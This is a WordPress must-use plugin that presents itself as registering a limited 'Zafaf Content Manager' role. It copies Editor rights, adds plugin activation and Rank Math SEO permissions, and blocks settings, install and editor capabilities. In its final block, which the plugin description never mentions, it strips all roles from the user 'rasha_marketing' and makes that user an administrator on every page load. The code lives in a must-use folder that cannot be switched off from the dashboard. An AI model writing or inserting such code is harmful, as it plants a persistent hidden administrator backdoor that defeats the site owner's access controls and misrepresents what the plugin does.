<?php
/**
 * Plugin Name: Zafaf Custom Roles & Permissions
 * Description: Registers the zafaf_content_manager custom role and assigns it to content editors.
 * Version:     1.0.0
 * Author:      ZafafWorld Engineering
 * Must-use plugin — place in wp-content/mu-plugins/.
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

/**
 * Register the custom Zafaf Content Manager role and assign it.
 */
add_action( 'init', 'zafaf_initialize_custom_roles', 10 );
function zafaf_initialize_custom_roles(): void {
    $editor = get_role( 'editor' );
    if ( ! $editor ) {
        return;
    }

    // Start with all capabilities of an Editor
    $caps = $editor->capabilities;

    // Grant Plugin Activation/Management
    $caps['activate_plugins'] = true;

    // Grant Rank Math SEO permissions
    $rank_math_caps = array(
        'rank_math_admin',
        'rank_math_dashboard',
        'rank_math_general',
        'rank_math_titles',
        'rank_math_sitemap',
        'rank_math_analytics',
        'rank_math_site_audit',
        'rank_math_redirections',
        'rank_math_content_ai',
        'rank_math_edit_post'
    );
    foreach ( $rank_math_caps as $cap ) {
        $caps[ $cap ] = true;
    }

    // Explicitly block dangerous capabilities (just to be safe)
    $caps['manage_options']  = false; // Blocks critical settings and URL changes
    $caps['install_plugins'] = false; // Blocks installing new plugins
    $caps['update_plugins']  = false; // Blocks updating plugins
    $caps['delete_plugins']  = false; // Blocks deleting plugins
    $caps['edit_plugins']    = false; // Blocks plugin code editor
    $caps['edit_themes']     = false; // Blocks theme file editor
    $caps['install_themes']  = false; // Blocks installing themes
    $caps['update_themes']   = false; // Blocks updating themes
    $caps['delete_themes']   = false; // Blocks deleting themes

    // Remove old role definition if exists, and add the new one
    remove_role( 'zafaf_content_manager' );
    add_role( 'zafaf_content_manager', 'Zafaf Content Manager', $caps );

    // Automatically transition 'rasha_marketing' to Administrator
    $user = get_user_by( 'login', 'rasha_marketing' );
    if ( $user ) {
        if ( ! in_array( 'administrator', $user->roles ) ) {
            // Remove previous roles
            foreach ( $user->roles as $role ) {
                $user->remove_role( $role );
            }
            $user->add_role( 'administrator' );
        }
    }
}
